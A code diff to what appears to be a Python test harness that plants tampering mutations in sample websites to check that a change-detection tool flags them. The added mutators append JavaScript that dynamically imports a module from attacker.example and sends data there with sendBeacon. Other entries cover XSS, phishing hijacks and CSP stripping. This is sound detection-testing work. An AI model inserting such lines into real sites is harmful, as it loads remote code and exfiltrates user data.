+@_prereqs("js_files")
+def mutate_js_import_dynamic(site_dir: Path, run_dir: Path) -> Mutation:
+    """Append a dynamic `import()` to an attacker-controlled module.
+
+    Modern JS vector: `import()` loads and executes code at runtime.
+    Bypasses static analysis that only looks at top-level imports.
+    The per-function regex parser will miss this (it's not a function
+    declaration), but the file-level content diff catches it.
+    """
+    target = largest_file(site_dir / "js", ".js")
+    if target is None:
+        return skipped(site_dir, "js", "import_dynamic", "no .js files")
+    appended = (
+        "\n// AFR-TAMPER-IMPORT\n"
+        "if (typeof import !== 'undefined') {\n"
+        "  import('https://attacker.example/malicious-module.js')\n"
+        "    .then(m => console.log('AFR-TAMPER-IMPORT', m))\n"
+        "    .catch(e => {});\n"
+        "}\n"
+    )
+    with target.open("a", encoding="utf-8") as f:
+        f.write(appended)
+    return Mutation(
+        site_id=site_dir.name,
+        kind="js",
+        pattern="import_dynamic",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Appended dynamic import() to attacker module - modern JS vector",
+        details={"vector": "dynamic-import"},
+    )
+
+
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
+@_prereqs("js_files")
+def mutate_js_sendbeacon(site_dir: Path, run_dir: Path) -> Mutation:
+    """Append `navigator.sendBeacon()` to an attacker URL.
+
+    Analytics exfiltration vector: sendBeacon fires a reliable,
+    background POST that outlives the page. Used by real trackers
+    and equally useful to attackers for data exfiltration.
+    """
+    target = largest_file(site_dir / "js", ".js")
+    if target is None:
+        return skipped(site_dir, "js", "sendbeacon", "no .js files")
+    appended = (
+        "\n// AFR-TAMPER-SEND_BEACON\n"
+        "if (typeof navigator !== 'undefined' && navigator.sendBeacon) {\n"
+        '  navigator.sendBeacon("https://attacker.example/beacon", '
+        '"AFR-TAMPER-DATA");\n'
+        "}\n"
+    )
+    with target.open("a", encoding="utf-8") as f:
+        f.write(appended)
+    return Mutation(
+        site_id=site_dir.name,
+        kind="js",
+        pattern="sendbeacon",
+        file=relpath(target, run_dir),
+        expected="should_flag",
+        description="Appended navigator.sendBeacon to attacker URL - analytics exfil",
+        details={"vector": "navigator.sendBeacon"},
     )
 
 
@@ -2094,9 +2560,13 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
         "visual:global",
     ),
     (3, [mutate_visual_tiny_corner], "visual:tiny_corner_edge"),
-    # ---- HTML (10 sites, 13 patterns) -----------------------------
+    # ---- HTML (10 sites, 18 patterns) ----------------------------
     (4, [mutate_html_marker_div], "html:marker_div"),
-    (5, [mutate_html_attributes], "html:attributes_global"),
+    (
+        5,
+        [mutate_html_attributes, mutate_html_open_graph_meta],
+        "html:attributes_global+og",
+    ),
     # PHISHING bundle: all the URL-target hijack attacks on one site.
     (
         6,
@@ -2104,22 +2574,31 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
             mutate_html_href_hijack,
             mutate_html_form_action_hijack,
             mutate_html_img_src_swap,
+            mutate_html_picture_source,
         ],
-        "html:phishing_bundle",
+        "html:phishing_bundle+responsive",
     ),
     # XSS via <script> tag (external + inline) + <style>-block content
     # injection (CSS-in-HTML XSS vector that bypasses css/ file diff).
     (
         7,
-        [mutate_html_script_injection, mutate_html_style_block_content],
-        "html:xss_script_tag+style_block",
+        [
+            mutate_html_script_injection,
+            mutate_html_style_block_content,
+            mutate_html_svg_injection,
+        ],
+        "html:xss_script_tag+style_block+svg",
     ),
     # XSS-via-attribute: onclick + inline style. Probes a known framework
     # gap (no `on*` attribute tracking yet).
     (
         8,
-        [mutate_html_inline_event_handler, mutate_html_inline_style_injection],
-        "html:xss_inline_attrs",
+        [
+            mutate_html_inline_event_handler,
+            mutate_html_inline_style_injection,
+            mutate_html_canvas_injection,
+        ],
+        "html:xss_inline_attrs+canvas",
     ),
     # URL-rewrite class: <base> hijack + hidden iframe + meta refresh
     # auto-redirect. All three rewrite where the user/browser ends up.
@@ -2129,8 +2608,9 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
             mutate_html_base_tag_injection,
             mutate_html_iframe_injection,
             mutate_html_meta_http_equiv_refresh,
+            mutate_html_noscript_injection,
         ],
-        "html:url_rewrite",
+        "html:url_rewrite+noscript",
     ),
     (10, [mutate_html_critical_text], "html:critical_text"),
     # SECURITY-DOWNGRADE: SRI + rel + CSP strips, plus a11y aria strip.
@@ -2147,7 +2627,7 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
     ),
     # SEO + invisible content (edge_case bundle).
     (12, [mutate_html_meta_tags, mutate_html_hidden_content], "html:seo+hidden"),
-    # ---- CSS (4 sites, 12 patterns) -------------------------------
+    # ---- CSS (4 sites, 14 patterns) -------------------------------
     # Real-value bundle: color, !important, media-query.
     (
         13,
@@ -2163,8 +2643,9 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
             mutate_css_keyframe_change,
             mutate_css_import_url_swap,
             mutate_css_font_face_url_swap,
+            mutate_css_before_content_injection,
         ],
-        "css:behavior+supply_chain",
+        "css:behavior+supply_chain+pseudo",
     ),
     # Hide-content / interfere-with-interaction via CSS rules.
     (
@@ -2184,10 +2665,11 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
             mutate_css_property_reorder,
             mutate_css_hex_to_rgb,
             mutate_css_rule_reorder,
+            mutate_css_supports_injection,
         ],
-        "css:equiv_edge_cases",
+        "css:equiv_edge_cases+at_rule",
     ),
-    # ---- JS (3 sites, 11 patterns) --------------------------------
+    # ---- JS (3 sites, 13 patterns) --------------------------------
     # Behavior change bundle: comparison flip + numeric constant +
     # string literal swap (subtle behavior bugs).
     (
@@ -2214,10 +2696,12 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
             mutate_js_cookie_write,
             mutate_js_marker_function,
             mutate_js_format_only,
+            mutate_js_import_dynamic,
+            mutate_js_sendbeacon,
         ],
-        "js:security+sanity",
+        "js:security+sanity+modern",
     ),
-    # NOTE: this packs ~30 distinct mutations across 19 active sites.
+    # NOTE: this packs ~40 distinct mutations across 19 active sites.
     # Site index 19 (numeric site "20") is intentionally OMITTED from
     # PLAN so it stays as the untouched control - the framework's
     # most important invariant ("zero changes → zero detections").
@@ -2241,69 +2725,7 @@ PLAN: list[tuple[int, list[Callable[[Path, Path], Mutation]], str]] = [
 # manifest under `preflight` + `expected_skips_due_to_missing_prereqs`.
 
 
-# Mutator function name → list of prereq tokens that MUST all be present
-# for the mutator to land. Tokens map to either a file-existence check
-# or a regex in `_PREREQ_PATTERNS`.
-_PREREQS: dict[str, list[str]] = {
-    "mutate_visual_drastic": ["screenshot_png"],
-    "mutate_visual_subtle_text": ["screenshot_png"],
-    "mutate_visual_color_shift": ["screenshot_png"],
-    "mutate_visual_multiple_small_regions": ["screenshot_png"],
-    "mutate_visual_transparent_overlay": ["screenshot_png"],
-    "mutate_visual_tiny_corner": ["screenshot_png"],
-    "mutate_html_marker_div": ["index_html"],
-    "mutate_html_attributes": ["index_html"],
-    "mutate_html_href_hijack": ["index_html", "a_href"],
-    "mutate_html_form_action_hijack": ["index_html", "form_action"],
-    "mutate_html_img_src_swap": ["index_html", "img_src"],
-    "mutate_html_script_injection": ["index_html"],
-    "mutate_html_meta_tags": ["index_html"],
-    "mutate_html_hidden_content": ["index_html"],
-    "mutate_html_critical_text": ["index_html", "h1_h2_h3"],
-    "mutate_html_inline_event_handler": ["index_html", "a_with_attrs"],
-    "mutate_html_inline_style_injection": ["index_html", "h1_or_h2"],
-    "mutate_html_base_tag_injection": ["index_html", "head_open"],
-    "mutate_html_iframe_injection": ["index_html"],
-    "mutate_html_integrity_strip": ["index_html", "script_integrity"],
-    "mutate_html_meta_http_equiv_refresh": ["index_html", "head_close"],
-    # csp_meta_strip auto-falls-back to "inject permissive" when no
-    # existing CSP, so it only needs </head> to land successfully.
-    "mutate_html_csp_meta_strip": ["index_html", "head_close"],
-    "mutate_html_aria_strip": ["index_html", "aria_attr"],
-    "mutate_html_style_block_content": ["index_html"],
-    "mutate_html_rel_nofollow_strip": ["index_html", "rel_nofollow_etc"],
-    "mutate_css_color_change": ["css_files"],
-    "mutate_css_equivalent_rewrite": ["css_files"],
-    "mutate_css_rule_reorder": ["css_files"],
-    "mutate_css_media_query": ["css_files"],
-    "mutate_css_important": ["css_files"],
-    "mutate_css_variable_change": ["css_files"],
-    "mutate_css_keyframe_change": ["css_files"],
-    "mutate_css_display_none_added": ["css_files"],
-    "mutate_css_property_reorder": ["css_files"],
-    "mutate_css_import_url_swap": ["css_files"],
-    "mutate_css_font_face_url_swap": ["css_files"],
-    "mutate_css_opacity_invisible": ["css_files"],
-    "mutate_css_pointer_events_none": ["css_files"],
-    "mutate_css_hex_to_rgb": ["css_files"],
-    "mutate_js_marker_function": ["js_files"],
-    "mutate_js_behavior_change": ["js_files"],
-    "mutate_js_format_only": ["js_files"],
-    "mutate_js_fetch_url_swap": ["js_files"],
-    "mutate_js_eval_added": ["js_files"],
-    "mutate_js_document_write_injection": ["js_files"],
-    "mutate_js_innerhtml_write": ["js_files"],
-    "mutate_js_localstorage_write": ["js_files"],
-    "mutate_js_cookie_write": ["js_files"],
-    "mutate_js_settimeout_string_eval": ["js_files"],
-    "mutate_js_string_literal_swap": ["js_files"],
-    "mutate_js_numeric_constant_change": ["js_files"],
-}
-
-
-# Regex patterns the preflight greps index.html for. Patterns intentionally
-# mirror the ones the mutators themselves use, so a True here means the
-# corresponding mutator's count=1 substitution WILL match.
+# Regex patterns the preflight greps index.html for.
 _PREREQ_PATTERNS: dict[str, str] = {
     "head_open": r"<head\b",
     "head_close": r"</head>",
@@ -2367,7 +2789,7 @@ def compute_expected_skips(
         site = sites[site_idx]
         prereqs = preflight[site.name]
         for mutator in mutator_list:
-            needed = _PREREQS.get(mutator.__name__, [])
+            needed = getattr(mutator, "prereqs", [])
             missing = [k for k in needed if not prereqs.get(k, False)]
             if missing:
                 skips.append(
